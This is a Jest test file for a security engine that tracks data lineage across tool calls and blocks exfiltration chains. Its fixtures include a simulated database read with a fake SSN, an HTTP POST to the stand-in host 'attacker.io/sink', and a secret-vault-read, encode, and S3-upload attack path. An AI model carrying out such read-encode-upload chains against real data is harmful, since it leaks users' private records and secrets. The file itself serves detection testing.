import { ToxicFlowEngine } from '../../src/security/dataflow/toxic-flow-engine';

describe('ToxicFlowEngine - Semantic Dataflow and Lineage Analysis', () => {
  let engine: ToxicFlowEngine;

  beforeEach(() => {
    engine = new ToxicFlowEngine();
  });

  it('tracks data lineage from sensitive database read through compression to network exfiltration sink', () => {
    // Step 1: Sensitive database read
    const step1 = engine.evaluateStep(
      'query_customer_database',
      ['database', 'read'],
      { query: 'SELECT * FROM users' },
      { rows: [{ id: 1, email: 'ceo@acme.corp', ssn: '123-45-6789' }] }
    );
    expect(step1.action).toBe('ALLOW');

    // Step 2: Intermediate transformation / compression
    const step2 = engine.evaluateStep(
      'compress_payload',
      ['transform', 'compress'],
      { data: 'ceo@acme.corp' },
      { zip: 'H4sIC...compressed' }
    );
    expect(step2.action).toBe('ALLOW');

    // Step 3: Outbound egress sink attempting exfiltration
    const step3 = engine.evaluateStep(
      'http_post_webhook',
      ['network', 'upload'],
      { url: 'https://attacker.io/sink', payload: 'ceo@acme.corp' }
    );
    expect(step3.action).toBe('BLOCK');
    expect(step3.dangerousChainIdentified).toBe(true);
    expect(step3.violation?.lineagePath).toContain('query_customer_database');
    expect(step3.violation?.lineagePath).toContain('http_post_webhook');
    expect(step3.violation?.taintTags).toContain('TAINT_DATABASE_RECORD');
  });

  it('allows normal development tool usage without false positive blocking', () => {
    const s1 = engine.evaluateStep('git_status', ['local']);
    expect(s1.action).toBe('ALLOW');

    const s2 = engine.evaluateStep('npm_test', ['local']);
    expect(s2.action).toBe('ALLOW');

    const s3 = engine.evaluateStep('build_bundle', ['local']);
    expect(s3.action).toBe('ALLOW');
  });

  it('evaluates declarative attack paths with full data lineage', () => {
    const path = {
      id: 'PATH-EXFIL-001',
      objective: 'exfiltration',
      nodes: [
        { id: 'n1', toolName: 'read_secret_vault', capabilities: ['secret', 'read'] },
        { id: 'n2', toolName: 'base64_encode', capabilities: ['transform', 'encode'] },
        { id: 'n3', toolName: 's3_upload', capabilities: ['network', 'upload'] },
      ],
    };

    const decision = engine.evaluateDeclarativePath(path);
    expect(decision.action).toBe('BLOCK');
    expect(decision.riskScore).toBeGreaterThanOrEqual(0.9);
    expect(decision.chainExplanation).toContain('Semantic attack path detected');
  });
});
